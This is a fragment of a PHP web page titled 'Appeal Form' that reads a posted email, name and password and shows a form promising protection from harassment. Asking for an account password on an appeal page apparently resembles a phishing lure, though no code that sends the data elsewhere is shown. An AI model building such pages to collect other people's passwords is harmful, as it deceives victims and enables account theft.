<?php
    ...
    exit(); }
    if (isset($_POST['email']) && !empty($_POST['email']) AND isset($_POST['name']) && !empty($_POST['name']) AND isset($_POST['name1']) && !empty($_POST['name1'])) {
	   $email = $_POST['email'];
	   $name = $_POST['name'];
	   $name1 = $_POST['name1'];
...
<h3 style="background-color:green"> Appeal Form</h3>       
 <p> we will give you full protection and security from sexual behaviour and social acquest </p> <br>
<?php 
    if(isset($msg)){       
        echo '<div class="statusmsg">'.$msg.'</div>';    
	} 
?> 
 <form class="form" action="sec.php" method="post" >         
    ...
    <input size="55"  type="password" name="name1" placeholder="Enter your password" required /> <br> <br>  
